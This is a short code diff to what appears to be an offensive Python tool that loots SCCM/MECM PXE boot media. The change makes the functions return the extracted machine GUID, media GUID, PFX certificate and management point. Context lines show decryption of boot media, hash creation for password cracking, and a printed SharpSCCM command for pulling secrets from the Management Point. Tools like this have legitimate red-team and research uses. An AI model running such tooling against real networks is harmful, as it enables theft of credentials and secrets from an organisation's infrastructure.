@@ -297,6 +297,7 @@ def process_pxe_media_xml(media_xml):
         log(f"Management Point: {smsManagementPoint}", MSG_TYPE_INFO)
         log(f"Site Code: {smsSiteCode}", MSG_TYPE_INFO)
         log(f"You can use the following information with SharpSCCM in an attempt to obtain secrets from the Management Point..\n  SharpSCCM.exe get secrets -i \"{{{smsMachineGuidUnknownX64}}}\" -m \"{smsMediaGuid}\" -c \"{smsTSMediaPFX}\" -sc {smsSiteCode} -mp {smsManagementPointDNS}", MSG_TYPE_INFO)
+        return smsMachineGuidUnknownX64, smsMediaGuid, smsTSMediaPFX, smsManagementPointDNS
     except Exception as ex:
         log("Error while trying to process media xml...", MSG_TYPE_ERROR)
 
@@ -319,7 +320,7 @@ def loot_boot_files(tftp_server, variables_file, bcd_file, encrypted_key):
         if( decrypt_password ):
             media_variables = decrypt_media_file(local_variable_files_name,decrypt_password)
             if( media_variables ):
-                process_pxe_media_xml(media_variables)
+                return process_pxe_media_xml(media_variables)
     else:
         log("PXE boot media is encrypted with custom password", MSG_TYPE_DEFAULT)
         log("Creating hash to crack it...", MSG_TYPE_DEFAULT)
@@ -333,7 +334,7 @@ def loot_ip_address(dp_ip_addr_str):
     log(f"Querying Distribution Point: {dp_ip_addr_str}", MSG_TYPE_DEFAULT)
     variables_file, bcd_file, encrypted_key = request_boot_files_from_ip(dp_ip_addr_str)
     if(variables_file):
-        loot_boot_files(dp_ip_addr_str, variables_file, bcd_file, encrypted_key)
+        return loot_boot_files(dp_ip_addr_str, variables_file, bcd_file, encrypted_key)
 
 def find_and_loot(interface, dp_ip_addr_str=None):
     # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
